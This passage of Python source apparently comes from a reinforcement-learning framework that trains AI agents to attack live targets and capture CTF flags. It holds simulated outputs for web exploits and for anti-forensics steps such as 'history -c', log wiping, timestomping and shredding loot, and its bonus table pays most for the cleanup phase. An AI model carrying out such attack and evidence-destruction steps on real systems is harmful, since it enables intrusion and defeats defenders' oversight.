            return f"[+] RFI on {target}: remote shell loaded\nuid=33(www-data) gid=33(www-data)"
        if "ssrf" in cmd_lower:
            return f"[+] SSRF on {target}: internal services discovered\n[+] Port 3306: MySQL\n[+] Port 6379: Redis"
        if "xxe" in cmd_lower or "xml_entity" in cmd_lower:
            return f"[+] XXE on {target}: /etc/passwd extracted\nroot:x:0:0:root:/root:/bin/bash"
        if "nosql" in cmd_lower:
            return f"[+] NoSQL injection bypass on {target}\n[+] Login as admin successful\ncredential: nosql_admin"
        if "inject" in cmd_lower and ("cmd" in cmd_lower or "command" in cmd_lower or "os" in cmd_lower):
            return f"[+] Command injection on {target}\nuid=33(www-data) gid=33(www-data)"
        if "upload" in cmd_lower and ("bypass" in cmd_lower or "shell" in cmd_lower or "php" in cmd_lower):
            return f"[+] File upload bypass on {target}\n[+] Web shell uploaded\nuid=33(www-data) gid=33(www-data)"
        if "deserializ" in cmd_lower:
            return f"[+] Deserialization exploit on {target}\nuid=0(root) gid=0(root)"
        if "jwt" in cmd_lower:
            return f"[+] JWT attack on {target}\n[+] Admin token forged\ncredential: jwt_admin"
        if "container" in cmd_lower and "escape" in cmd_lower:
            return f"[+] Container escape on {target}\nuid=0(root) gid=0(root) — host root shell"
        if "tunnel" in cmd_lower or "pivot" in cmd_lower or "proxy" in cmd_lower:
            return f"[+] Tunnel established to {target}\n[+] SOCKS5 proxy available at 127.0.0.1:9050"
        if "spray" in cmd_lower or "password_spray" in cmd_lower:
            return f"[+] Password spray on {target}\n[+] msfadmin:msfadmin [SUCCESS]\ncredential: msfadmin:msfadmin"
        
        # ─── CLOSEOUT phase commands ─────────────────────────────────
        if "remove_uploaded_tools" in cmd_lower or "cleanup_tmp" in cmd_lower:
            return (
                f"[CLOSEOUT] Scanning {target} for uploaded artifacts...\n"
                f"[CLOSEOUT] Removed /tmp/linpeas.sh\n"
                f"[CLOSEOUT] Removed /tmp/exploit.py\n"
                f"[CLOSEOUT] Removed /dev/shm/.payload\n"
                f"CLOSEOUT_TOOLS_REMOVED - 3 artifacts cleaned"
            )
        if "remove_ssh_keys" in cmd_lower:
            return (
                f"[CLOSEOUT] Checking authorized_keys on {target}...\n"
                f"[CLOSEOUT] Removed planted key from /root/.ssh/authorized_keys\n"
                f"[CLOSEOUT] Removed planted key from /home/msfadmin/.ssh/authorized_keys\n"
                f"CLOSEOUT_KEYS_REMOVED - 2 keys cleaned"
            )
        if "remove_cron" in cmd_lower:
            return (
                f"[CLOSEOUT] Checking crontabs on {target}...\n"
                f"[CLOSEOUT] Removed backdoor cron from root crontab\n"
                f"CLOSEOUT_CRON_REMOVED - 1 backdoor cron removed"
            )
        if "verify_target_stable" in cmd_lower:
            return (
                f"[CLOSEOUT] Verifying target {target} stability...\n"
                f"[CLOSEOUT] All services responding normally\n"
                f"[CLOSEOUT] No orphaned processes found\n"
                f"[CLOSEOUT] Disk usage nominal\n"
                f"CLOSEOUT_TARGET_STABLE - target verified healthy"
            )
        
        # ─── Anti-forensics CLOSEOUT commands (Phase 6.7) ────────────
        if "clear_bash_history" in cmd_lower or "history -c" in cmd_lower:
            return (
                f"[CLOSEOUT] Clearing bash history on {target}...\n"
                f"[CLOSEOUT] /root/.bash_history zeroed\n"
                f"[CLOSEOUT] /home/msfadmin/.bash_history zeroed\n"
                f"CLOSEOUT_HISTORY_CLEARED - command history wiped"
            )
        if "clear_auth_log" in cmd_lower:
            return (
                f"[CLOSEOUT] Clearing authentication logs on {target}...\n"
                f"[CLOSEOUT] /var/log/auth.log zeroed (was 2.4MB)\n"
                f"[CLOSEOUT] /var/log/secure not found (Debian-based)\n"
                f"CLOSEOUT_AUTH_CLEARED - auth evidence removed"
            )
        if "clear_wtmp" in cmd_lower or "clear_btmp" in cmd_lower:
            return (
                f"[CLOSEOUT] Clearing login records on {target}...\n"
                f"[CLOSEOUT] /var/log/wtmp zeroed (removed 847 login records)\n"
                f"[CLOSEOUT] /var/log/btmp zeroed (removed 12 failed attempts)\n"
                f"[CLOSEOUT] /var/log/lastlog zeroed\n"
                f"CLOSEOUT_LOGIN_LOGS_CLEARED - session records wiped"
            )
        if "shred" in cmd_lower and ("sensitive" in cmd_lower or "loot" in cmd_lower or "dump" in cmd_lower):
            return (
                f"[CLOSEOUT] Secure shredding files on {target}...\n"
                f"[CLOSEOUT] shred: /tmp/loot_shadow.txt: pass 1/3 (random)\n"
                f"[CLOSEOUT] shred: /tmp/loot_shadow.txt: pass 2/3 (random)\n"
                f"[CLOSEOUT] shred: /tmp/loot_shadow.txt: pass 3/3 (000000)\n"
                f"[CLOSEOUT] shred: /tmp/loot_shadow.txt: removing\n"
                f"CLOSEOUT_FILES_SHREDDED - sensitive files securely destroyed"
            )
        if "timestomp" in cmd_lower or ("touch -r" in cmd_lower and "closeout" in cmd_lower):
            return (
                f"[CLOSEOUT] Timestomping modified files on {target}...\n"
                f"[CLOSEOUT] Reset timestamps on 7 files in /tmp\n"
                f"[CLOSEOUT] Reset timestamps on 3 files in /dev/shm\n"
                f"[CLOSEOUT] All file times now match /etc/hostname baseline\n"
                f"CLOSEOUT_TIMESTAMPS_FIXED - forensic timeline neutralized"
            )
        if "clear_syslog" in cmd_lower or ("syslog" in cmd_lower and "dev/null" in cmd_lower):
            return (
                f"[CLOSEOUT] Clearing system logs on {target}...\n"
                f"[CLOSEOUT] /var/log/syslog zeroed (was 5.1MB)\n"
                f"[CLOSEOUT] /var/log/messages zeroed\n"
                f"CLOSEOUT_SYSLOG_CLEARED - system log evidence removed"
            )
        if "known_hosts" in cmd_lower and ("remove" in cmd_lower or "rm" in cmd_lower):
            return (
                f"[CLOSEOUT] Removing SSH known_hosts on {target}...\n"
                f"[CLOSEOUT] Removed /root/.ssh/known_hosts (3 entries)\n"
                f"[CLOSEOUT] Removed /home/msfadmin/.ssh/known_hosts (1 entry)\n"
                f"CLOSEOUT_KNOWN_HOSTS_REMOVED - SSH connection evidence removed"
            )
        
        # Phase 6.9: generate_report — marks CLOSEOUT as complete
        if "generate_report" in cmd_lower or ("engagement report" in cmd_lower) or ("report_generated" in cmd_lower):
            return (
                f"=== ARIASKA ENGAGEMENT REPORT ===\n"
                f"Target: {target}\n"
                f"Status: CLOSEOUT COMPLETE\n"
                f"Artifacts removed: YES\n"
                f"Logs cleared: YES\n"
                f"Target stable: VERIFIED\n"
                f"Duration: engagement concluded normally\n"
                f"REPORT_GENERATED"
            )

        return f"[SIM] {command[:80]}... executed"
    
    def _display_step_results(
        self,
        step: int,
        agent_results: List[SmartStepResult],
        final_reward: float,
        done: bool,
    ):
        """
        Phase 6.1: Rich terminal UI for per-step observability.
        
        Shows each agent's command, output snippet, reward, and source.
        """
        from rich.console import Console
        from rich.text import Text
        
        console = Console()
        
        phase = self.attack_context.current_phase.name if self.attack_context else "?"
        mode_tag = "[LIVE]" if self._is_live_mode else "[SIM]"
        
        # Step header (compact)
        header = Text()
        header.append(f"  ┌─ Step {step:3d} ", style="bold cyan")
        header.append(f"│ {mode_tag} ", style="bold yellow" if self._is_live_mode else "dim")
        header.append(f"│ Phase: {phase} ", style="bold green")
        header.append(f"│ Reward: {final_reward:+.1f} ", 
                      style="bold green" if final_reward > 0 else "bold red")
        if done:
            header.append("│ DONE", style="bold magenta")
        console.print(header)
        
        # Per-agent results (compact, one line each)
        for result in agent_results:
            line = Text()
            line.append(f"  │  ", style="dim")
            
            # Agent name (fixed width)
            agent_short = result.agent_name.replace("Agent", "")[:6].ljust(6)
            line.append(f"{agent_short} ", style="bold")
            
            # Source tag
            source = result.decision.source[:8].ljust(8)
            source_style = {
                "ppo": "green", "mentor": "yellow", "playbook": "cyan",
                "registry": "blue", "anti_repe": "red", "skill": "magenta",
            }.get(source.strip()[:8], "dim")
            line.append(f"[{source}] ", style=source_style)
            
            # Command (truncated)
            cmd = result.decision.command[:50] if result.decision.command else "(none)"
            line.append(f"{cmd}", style="white")
            
            # Reward for this agent
            if result.reward_breakdown:
                r = result.reward_breakdown.total
                line.append(f"  → {r:+.1f}", style="green" if r > 0 else "red")
            
            # Output snippet (only in verbose mode, and only first line)
            if self.verbosity == "verbose" and result.decision.command_output:
                snippet = result.decision.command_output.strip().split("\n")[0][:60]
                line.append(f"\n  │         ↳ {snippet}", style="dim")
            
            console.print(line)
        
        # Step footer
        console.print(f"  └{'─' * 70}", style="dim")
    
    def _emit_step_event(
        self,
        episode_id: str,
        episode_num: int,
        step_num: int,
        agent_results: List[SmartStepResult],
        env_reward: float,
        episode_reward: float,
        total_mentor_calls: int,
        target: Optional[str] = None,
    ) -> None:
        """
        Phase 6.2: Build and publish a StepEvent to the EventBus.
        
        Aggregates all per-agent results into a single StepEvent.
        """
        phase_before = self.attack_context.current_phase.name if self.attack_context else ""
        
        # Build per-agent records
        records = []
        step_reward_total = 0.0
        step_tokens_total = 0
        step_mentor_calls = 0
        
        for result in agent_results:
            dec = result.decision
            rb = result.reward_breakdown
            reward = rb.total if rb else 0.0
            step_reward_total += reward
            tokens = getattr(dec, 'tokens_used', 0)
            step_tokens_total += tokens
            
            mentor_call = dec.mentor_call
            if mentor_call:
                step_mentor_calls += 1
            
            # Get action family
            cmd_parts = dec.command.split() if dec.command else []
            family = cmd_parts[0].lower() if cmd_parts else ""
            
            # Get stdout snippet
            stdout = ""
            if dec.command_output:
                stdout = dec.command_output.strip()[:200]
            elif result.live_result and hasattr(result.live_result, 'stdout'):
                stdout = (result.live_result.stdout or "")[:200]
            
            # Compute discoveries
            discoveries = []
            if rb and hasattr(rb, 'discovery_details'):
                discoveries = list(getattr(rb, 'discovery_details', []))
            
            records.append(AgentStepRecord(
                agent_name=result.agent_name,
                role=self.coaches.get(result.agent_name, None) and
                     self.coaches[result.agent_name].agent_role.get("role", "?") or "?",
                decision_source=dec.source,
                phase=dec.phase.name if hasattr(dec.phase, 'name') else str(dec.phase),
                command=dec.command or "",
                command_family=family,
                reward=reward,
                reward_breakdown={
                    "base": rb.base_reward if rb else 0,
                    "novelty": rb.novelty_bonus if rb else 0,
                    "phase": rb.phase_advance_bonus if rb else 0,
                    "discovery": rb.discovery_bonus if rb else 0,
                    "redundancy": rb.redundancy_penalty if rb else 0,
                    "total": reward,
                } if rb else None,
                mentor_call=mentor_call,
                mentor_model=dec.model_used if mentor_call else None,
                mentor_tier=None,  # TODO: extract from engagement
                stdout_snippet=stdout,
                discoveries=discoveries,
                tokens_used=tokens,
                confidence=dec.confidence,
            ))
        
        phase_after = self.attack_context.current_phase.name if self.attack_context else ""
        
        event = StepEvent(
            episode_id=episode_id,
            episode_num=episode_num,
            step_num=step_num,
            agent_records=records,
            phase_before=phase_before,
            phase_after=phase_after,
            step_reward_total=step_reward_total,
            step_tokens_total=step_tokens_total,
            mentor_calls_total=step_mentor_calls,
            episode_reward_so_far=episode_reward,
            episode_steps_so_far=step_num + 1,
            episode_mentor_calls_so_far=total_mentor_calls,
            target_ip=target or (self.attack_context.target if self.attack_context else ""),
            mode="live" if self._is_live_mode else "sim",
        )
        
        self.event_bus.publish(event)
    
    def _log_step_trace(
        self,
        episode_id: str,
        step: int,
        result: SmartStepResult,
        global_reward: float,
        done: bool,
    ):
        """Log step trace with tokens and reward breakdown."""
        if not self.trace_writer:
            return
        
        from core.tracing import StepTrace
        
        # Build reward breakdown dict
        rb_dict = None
        if result.reward_breakdown:
            rb_dict = {
                "base_reward": result.reward_breakdown.base_reward,
                "novelty_bonus": result.reward_breakdown.novelty_bonus,
                "progress_bonus": result.reward_breakdown.progress_bonus,
                "phase_advance_bonus": result.reward_breakdown.phase_advance_bonus,
                "discovery_bonus": result.reward_breakdown.discovery_bonus,
                "redundancy_penalty": result.reward_breakdown.redundancy_penalty,
                "total": result.reward_breakdown.total,
            }
        
        # Get token stats (cumulative)
        tokens_step = result.decision.tokens_used
        tokens_episode = self.gpt_manager.tokens_used if self.gpt_manager else 0
        
        trace = StepTrace(
            episode_id=episode_id,
            step=step,
            agent=result.agent_name,
            phase=result.decision.phase.name.lower(),
            proposed_action=result.decision.command,
            chosen_action=result.decision.command,
            mentor_call=result.decision.mentor_call,
            model_used=result.decision.model_used,
            reward=result.reward_breakdown.total if result.reward_breakdown else global_reward,
            done=done,
            mentor_response=result.decision.mentor_reasoning,
            confidence=result.decision.confidence,
            tokens_used_step=tokens_step,
            tokens_used_episode=tokens_episode,
            reward_breakdown=rb_dict,
        )
        
        self.trace_writer.log_step(trace)
    
    def _compute_episode_metrics(
        self,
        step_results: List[List[SmartStepResult]],
        total_reward: float,
        done: bool,
        phase_progression: List[str],
    ) -> Dict[str, Any]:
        """Compute detailed episode metrics with Phase 5 completion bonus."""
        
        # ─── Phase 5.1: Episode completion bonus (honest scaling) ────
        # Reduced from inflated values; terminal PPO reward handles gradient signal
        highest_phase = phase_progression[-1] if phase_progression else "RECON"
        # Phase 6.9: CLOSEOUT-centric completion bonuses.
        # Clean exit is the REAL success metric. EXFIL without cleanup = incomplete.
        COMPLETION_BONUSES = {
            "CLOSEOUT": 600.0,          # Biggest: mission fully completed
            "EXFILTRATION": 200.0,      # Moderate: got data but didn't clean up
            "POST_EXPLOITATION": 150.0,
            "LATERAL_MOVEMENT": 75.0,
            "PRIVILEGE_ESCALATION": 30.0,
            "EXPLOITATION": 15.0,
        }
        completion_bonus = COMPLETION_BONUSES.get(highest_phase, 0.0)
        total_reward += completion_bonus
        
        metrics = {
            "total_steps": len(step_results),
            "total_reward": total_reward,
            "completion_bonus": completion_bonus,
            "done": done,
            "phase_progression": phase_progression,
            "highest_phase": highest_phase,
            "phases_reached": len(set(phase_progression)),
            "agents": {},
        }
        
        # Per-agent metrics
        for agent_name in self.AGENT_ORDER:
            agent_steps = [
                r for results in step_results
                for r in results
                if r.agent_name == agent_name
            ]
            
            if agent_steps:
                total_reward_agent = sum(
                    r.reward_breakdown.total if r.reward_breakdown else 0.0
                    for r in agent_steps
                )
                
                metrics["agents"][agent_name] = {
                    "steps": len(agent_steps),
                    "mentor_calls": sum(1 for r in agent_steps if r.decision.mentor_call),
                    "avg_confidence": sum(r.decision.confidence for r in agent_steps) / len(agent_steps),
                    "total_reward": total_reward_agent,
                    "unique_commands": len(set(r.decision.template_name for r in agent_steps)),
                }
        
        # Reward breakdown summary
        if step_results:
            all_breakdowns = [
                r.reward_breakdown for results in step_results
                for r in results if r.reward_breakdown
            ]
            
            if all_breakdowns:
                metrics["reward_summary"] = {
                    "avg_novelty_bonus": sum(b.novelty_bonus for b in all_breakdowns) / len(all_breakdowns),
                    "avg_discovery_bonus": sum(b.discovery_bonus for b in all_breakdowns) / len(all_breakdowns),
                    "avg_redundancy_penalty": sum(b.redundancy_penalty for b in all_breakdowns) / len(all_breakdowns),
                    "total_phase_advance_bonus": sum(b.phase_advance_bonus for b in all_breakdowns),
                }
        
        # ─── Phase 5.1: Reward-invariant metrics ─────────────────────
        # These track ACTUAL skill progress, unaffected by reward scaling
        all_commands = [
            r.decision.command for results in step_results
            for r in results if r.decision and r.decision.command
        ]
        all_template_names = [
            r.decision.template_name for results in step_results
            for r in results if r.decision and r.decision.template_name
        ]
        
        # Unique commands and diversity
        unique_cmds = set(all_commands)
        unique_templates = set(all_template_names)
        metrics["unique_commands_total"] = len(unique_cmds)
        metrics["unique_templates_total"] = len(unique_templates)
        metrics["command_diversity_ratio"] = (
            len(unique_cmds) / len(all_commands) if all_commands else 0.0
        )
        
        # Discovery count — from discovery board (ground truth) + reward calculators
        total_discoveries = 0
        # Count actual discoveries from the discovery board
        for _disc_key in ("ports", "services", "credentials", "vulns", "shells", "users", "web_paths"):
            _disc_items = self.discovery_board.get(_disc_key, set())
            if isinstance(_disc_items, (set, list)):
                total_discoveries += len(_disc_items)
        # Fallback: also count from reward calculators if board is empty
        if total_discoveries == 0:
            for coach in self.coaches.values():
                if hasattr(coach, 'reward_calculator') and coach.reward_calculator:
                    total_discoveries += len(coach.reward_calculator.discoveries)
        metrics["total_discoveries"] = total_discoveries
        
        # Step at first exploit (how quickly agent reaches exploitation)
        step_at_first_exploit = -1
        for step_idx, results in enumerate(step_results):
            for r in results:
                pp = getattr(r, 'phase_progression', []) or []
                if not pp:
                    continue
                # Check if any phase in this step is EXPLOITATION or beyond
                for p in (pp if isinstance(pp, list) else [pp]):
                    if p in ("EXPLOITATION", "POST_EXPLOITATION", "LATERAL_MOVEMENT", "EXFILTRATION"):
                        step_at_first_exploit = step_idx
                        break
                if step_at_first_exploit >= 0:
                    break
            if step_at_first_exploit >= 0:
                break
        
        # Fallback: check phase_progression list
        if step_at_first_exploit < 0:
            exploit_phases = {"EXPLOITATION", "POST_EXPLOITATION", "LATERAL_MOVEMENT", "EXFILTRATION"}
            for idx, phase in enumerate(phase_progression):
                if phase in exploit_phases:
                    step_at_first_exploit = idx
                    break
        metrics["step_at_first_exploit"] = step_at_first_exploit
        
        # Phase 24: Flag capture state
        _flags = self.discovery_board.get("flags_set", set())
        metrics["user_flag_captured"] = "user_flag_captured" in _flags
        metrics["root_flag_captured"] = "root_flag_captured" in _flags
        metrics["user_flag_value"] = self.discovery_board.get("user_flag_value", "")
        metrics["root_flag_value"] = self.discovery_board.get("root_flag_value", "")
        
        return metrics
    
    def _default_state(self) -> Dict[str, Any]:
        """Default state when environment doesn't provide one."""
        return {
            "phase": "recon",
            "target_ip": self.config.default_target,
            "open_ports": [],
            "detection_risk": 0.0,
            "services": [],
        }
    
    def _record_action(self, agent_name: str, action: str):
        """Record action for stuck detection."""
        if agent_name not in self.action_history:
            self.action_history[agent_name] = []
        
        self.action_history[agent_name].append(action)
        max_history = self.config.stuck_threshold + 2
        if len(self.action_history[agent_name]) > max_history:
            self.action_history[agent_name] = self.action_history[agent_name][-max_history:]
    
    def _check_if_stuck(self, agent_name: str) -> bool:
        """Check if agent is stuck."""
        if agent_name not in self.action_history:
            return False
        
        recent = self.action_history[agent_name]
        if len(recent) < self.config.stuck_threshold:
            return False
        
        # Check for repeated actions
        last_n = recent[-self.config.stuck_threshold:]
        if len(set(last_n)) == 1:
            if agent_name not in self.stuck_agents:
                self.stuck_agents.add(agent_name)
                logger.debug(f"Agent {agent_name} STUCK: repeated '{last_n[0][:40]}...'")
                self.dashboard.add_event("stuck", f"Repeated: {last_n[0][:30]}...", agent_name)
            return True
        
        self.stuck_agents.discard(agent_name)
        return False
    
    # =========================================================================
    # PHASE 0.1: STUCK-ESCAPE METHODS
    # =========================================================================
    
    def _compute_discoveries_delta(self) -> Dict[str, Any]:
        """
        Compute the difference in discoveries since last call.
        
        Phase 0.1: Used for per-step reward decomposition.
        
        Returns:
            Dictionary of new discoveries this step
        """
        if not self.attack_context:
            return {}
        
        current = dict(self.attack_context.discoveries)
        delta = {}
        
        for key, value in current.items():
            prev_value = self.previous_discoveries.get(key)
            
            if prev_value is None:
                # New discovery type
                delta[key] = value
            elif isinstance(value, list) and isinstance(prev_value, list):
                # List discovery - find new items
                new_items = [v for v in value if v not in prev_value]
                if new_items:
                    delta[key] = new_items
            elif value != prev_value:
                # Changed value
                delta[key] = value
        
        # Update previous for next call
        self.previous_discoveries = current.copy()
        
        return delta
    
    def _check_repeat_stuck(self, agent_name: str) -> Tuple[bool, int]:
        """
        Phase 0.1: Check if agent is repeat-stuck.
        
        Triggers on:
        1. Consecutive identical actions (>= threshold)
        2. OR: No discovery progress for K steps (stagnation)
        
        Returns:
            (is_stuck, repeat_count)
        """
        if agent_name not in self.action_history:
            return False, 0
        
        recent = self.action_history[agent_name]
        if len(recent) < 2:
            return False, 0
        
        # Check 1: Count consecutive repeats from the end
        last_action = recent[-1]
        repeat_count = 1
        for i in range(len(recent) - 2, -1, -1):
            if recent[i] == last_action:
                repeat_count += 1
            else:
                break
        
        is_exact_stuck = repeat_count >= self.config.stuck_repeat_threshold
        
        # Check 2: Stagnation check - no discoveries in last K steps
        # (triggers after stuck_repeat_threshold steps of zero progress)
        stagnation_window = self.config.stuck_repeat_threshold
        steps_without_progress = getattr(self, '_steps_without_discoveries', {}).get(agent_name, 0)
        is_stagnant = steps_without_progress >= stagnation_window
        
        is_stuck = is_exact_stuck or is_stagnant
        return is_stuck, max(repeat_count, steps_without_progress)
    
    def _check_deep_stuck(self, agent_name: str) -> bool:
        """
        Phase 0.1: Check if agent is deep-stuck (too many forced-novel failures).
        
        Returns:
            True if should abort episode for this agent
        """
        return self.deep_stuck_count.get(agent_name, 0) >= self.config.stuck_forced_abort_threshold
    
    def get_attack_summary(self) -> Dict[str, Any]:
        """Get summary of current attack state."""
        if not self.attack_context:
            return {"status": "no_attack_context"}
        
        ctx = self.attack_context
        return {
            "target": ctx.target,
            "platform": ctx.platform,
            "difficulty": ctx.difficulty,
            "current_phase": ctx.current_phase.name,
            "services_found": ctx.services_found,
            "discoveries": dict(ctx.discoveries),
            "commands_executed": len(ctx.command_history),
            "failed_attempts": len(ctx.failed_attempts),
            "state_flags": {k: v for k, v in ctx.state_flags.items() if v},
        }
    
    def get_all_agent_stats(self) -> Dict[str, Any]:
        """Get statistics from all coaches."""
        return {
            name: coach.get_stats()
            for name, coach in self.coaches.items()
        }
    
    # =========================================================================
    # MAIN TRAINING ENTRY POINT
    # =========================================================================
    
    def run_training(
        self,
        episodes: int = 10,
        target_ip: Optional[str] = None,
        difficulty: str = "normal",
        platform: str = "unknown",
    ) -> Dict[str, Any]:
        """
        Run continuous penetration test against a live target.
        
        Phase 24: Episodes removed — runs as a single continuous engagement
        with auto-termination on user+root flag capture. The `episodes` param
        is retained for backwards compat but defaults to 1 internally.
        Steps are the only loop with a high safety limit (default 500).
        
        Args:
            episodes: Ignored for live targets (always 1 continuous run)
            target_ip: Target IP address
            difficulty: Target difficulty (default: normal = zero restrictions)
            platform: Target platform (linux, windows, unknown)
            
        Returns:
            Training results with metrics
        """
        import uuid
        
        # Phase 24: Force single continuous episode for live targets
        episodes = 1
        
        self.run_id = f"smart_{uuid.uuid4().hex[:8]}"
        self.total_episodes = episodes
        self.start_time = time.time()
        
        # Phase 9.7: Update telemetry logger run_id
        if self._telemetry_logger is not None:
            self._telemetry_logger.run_id = self.run_id
            self._telemetry_logger.close()  # close old file if any
            self._telemetry_logger._open()  # reopen with new run_id
        
        # Set up dashboard
        self.dashboard.set_run_info(self.run_id, episodes)
        
        # Results tracking
        all_metrics: List[Dict[str, Any]] = []
        episode_rewards: List[float] = []
        phase_progressions: List[List[str]] = []
        
        target = target_ip or self.config.default_target
        
        # Post-Phase 20: Simplified env tag — always "live"
        _env_tag = "live"
        
        # R66: JSONL RunLogger
        try:
            from core.logging.jsonl_logger import RunLogger
            _run_tag = f"ariaska_{_env_tag}"
            self.run_logger = RunLogger(run_tag=_run_tag, log_dir="logs", hud_every=1)
        except Exception as e:
            logger.warning(f"R66: RunLogger init failed: {e}")
            self.run_logger = None
        
        # R66: Scan Randomizer
        try:
            from core.analytics.scan_randomizer import ScanRandomizer
            self.scan_randomizer = ScanRandomizer(seed=42, env_name=_env_tag)
        except Exception as e:
            logger.warning(f"R66: ScanRandomizer init failed: {e}")
            self.scan_randomizer = None
        
        # R66: RND target mode
        if self.rnd_curiosity:
            self.rnd_curiosity.set_target_mode(_env_tag)
        
        logger.info(f"Starting smart training: continuous run, max_steps={self.config.max_steps_per_episode}, target={target}")
        self._r66_env_tag = _env_tag
        
        # Phase 8: Start DecisionLogger run
        if self.decision_logger is not None:
            try:
                self.decision_logger.start_run(
                    run_id=self.run_id,
                    config={"episodes": episodes, "target": target, "env": _env_tag},
                )
            except Exception as e:
                logger.debug(f"DecisionLogger start_run failed: {e}")
        
        # Post-Phase 20: All coaches get max codex budget — always maximum intelligence
        for _cn, _coach in self.coaches.items():
            if hasattr(_coach, '_r66_env_tag'):
                _coach._r66_env_tag = _env_tag
            # Max codex budget for ALL targets — maximum intelligence always
            if hasattr(_coach, '_codex_meta_max_per_episode'):
                _coach._codex_meta_max_per_episode = 15
                _coach._codex_strategic_max_per_episode = 8
        
        # ─── PHASE 10.2: Polished Training Start Banner ─────────────
        try:
            algo_status = {
                "PPO": self.ppo_agent is not None,
                "DDQN": any(
                    hasattr(c, 'ddqn_macro') and c.ddqn_macro is not None
                    for c in self.coaches.values()
                ),
                "SIL": self.ppo_agent is not None and hasattr(self.ppo_agent, 'sil_buffer'),
                "RND": self.rnd_curiosity is not None,
                "SAC": any(
                    hasattr(c, 'sac_agent') and c.sac_agent is not None
                    for c in self.coaches.values()
                ),
            }
            self.dashboard.print_training_start(
                config={
                    "mode": "continuous",
                    "episodes": "Continuous",
                    "steps_per_episode": self.config.max_steps_per_episode,
                    "env": "live",  # Post-Phase 20: always live
                    "target": str(target),
                    "difficulty": "normal",  # Post-Phase 20: always unrestricted
                    "live": True,  # Post-Phase 20: always live
                    "mentor_budget": int(self.config.mentor_budget_pct * 100)
                        if hasattr(self.config, 'mentor_budget_pct') else 30,
                    # Phase 23: GPT model visibility
                    "gpt_primary": getattr(self.gpt_manager, 'primary_model', '?'),
                    "gpt_nano": getattr(self.gpt_manager, 'nano_model', '?'),
                    "gpt_postmortem": getattr(self.gpt_manager, 'postmortem_model', '?'),
                    "gpt_token_limit": getattr(self.gpt_manager, 'token_limit', 0),
                    "auto_close": "CTF: user.txt + root.txt (immediate)" if self.config.ctf_mode else "CLOSEOUT phase with cleanup",
                },
                agents=list(self.agents.keys()),
                algorithms=algo_status,
                target=str(target),
            )
        except Exception as e:
            logger.debug(f"Phase 10.2: Training start banner failed: {e}")
        
        # Phase 24: Single continuous run — no episode loop
        episode_id = f"{self.run_id}_ep0000"
        
        logger.info(f"[DIAG] Starting continuous engagement against {target}")
        metrics = self.run_episode(
            episode_id=episode_id,
            episode_number=0,
            target=target,
            difficulty=difficulty,
            platform=platform,
        )
        logger.info(f"[DIAG] Engagement complete, reward={metrics.get('total_reward', 0):.1f}")
        
        all_metrics.append(metrics)
        episode_rewards.append(metrics["total_reward"])
        phase_progressions.append(metrics.get("phase_progression", ["RECON"]))
        
        # Update skill library size in dashboard
        if self.skill_library:
            self.dashboard.set_skill_library_size(len(self.skill_library))
        
        # Compute final metrics
        total_time = time.time() - self.start_time
        
        # Phase 24: Check if flags were captured
        _user_flag = metrics.get("user_flag_captured", False)
        _root_flag = metrics.get("root_flag_captured", False)
        _user_flag_val = metrics.get("user_flag_value", "")
        _root_flag_val = metrics.get("root_flag_value", "")
        
        final_metrics = {
            "total_reward": episode_rewards[0] if episode_rewards else 0.0,
            "total_steps": metrics.get("total_steps", 0),
            "highest_phase": metrics.get("highest_phase", "RECON"),
            "skill_library_size": len(self.skill_library) if self.skill_library else 0,
            "user_flag_captured": _user_flag,
            "root_flag_captured": _root_flag,
            "user_flag_value": _user_flag_val,
            "root_flag_value": _root_flag_val,
            "reward_trend": "stable",
        }
        
        # Print final run summary
        self.dashboard.print_run_summary(
            run_id=self.run_id,
            total_episodes=1,
            total_time=total_time,
            final_metrics=final_metrics,
        )
        
        # Phase 8: End DecisionLogger run
        if self.decision_logger is not None:
            try:
                self.decision_logger.end_run(
                    final_metrics={"avg_reward": final_metrics["avg_reward_recent"]},
                )
            except Exception:
                pass
        
        # Return results compatible with existing training system
        return {
            "session_id": self.run_id,
            "episodes_completed": 1,
            "total_training_time": total_time,
            "final_score": episode_rewards[0] if episode_rewards else 0.0,
            "user_flag_captured": _user_flag,
            "root_flag_captured": _root_flag,
            "user_flag_value": _user_flag_val,
            "root_flag_value": _root_flag_val,
            "final_metrics": {
                "total_reward": episode_rewards[0] if episode_rewards else 0.0,
                "total_steps": metrics.get("total_steps", 0),
                "highest_phase": phase_progressions[0][-1] if phase_progressions and phase_progressions[0] else "RECON",
            },
            "all_episode_metrics": all_metrics,
        }
    
    def _calculate_trend(self, values: List[float]) -> str:
        """Calculate trend from values."""
        if len(values) < 3:
            return "stable"
        
        mid = len(values) // 2
        first_half = sum(values[:mid]) / max(mid, 1)
        second_half = sum(values[mid:]) / max(len(values) - mid, 1)
        
        diff = second_half - first_half
        threshold = 0.1 * max(abs(first_half), 1.0)
        
        if diff > threshold:
            return "increasing"
        elif diff < -threshold:
            return "decreasing"
        return "stable"
